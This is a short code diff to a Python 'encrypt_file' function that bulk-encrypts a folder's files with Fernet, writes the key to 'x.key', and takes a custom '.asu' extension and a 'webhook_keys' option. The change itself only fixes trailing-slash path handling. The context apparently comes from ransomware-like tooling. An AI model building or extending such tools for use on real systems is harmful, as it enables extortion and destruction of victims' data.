@@ -50,12 +50,19 @@ def encrypt_file(folder_path, custom_ext = ".asu", webhook_keys = "y"):
     key = generate_key()
     file_arr = []
     fernet_key = Fernet(key)
+    
+    check_path = folder_path[-1]
+    
+    if check_path == "/":
+        folder_path = folder_path
+    else:
+        folder_path = folder_path + "/"
 
     with open("x.key", "wb") as f:
         f.write(key)
 
     for file in os.listdir(folder_path):
-        file = folder_path + "/" + file
+        file = folder_path + file
         if isfile(file):
             file_arr.append(file)
         else:
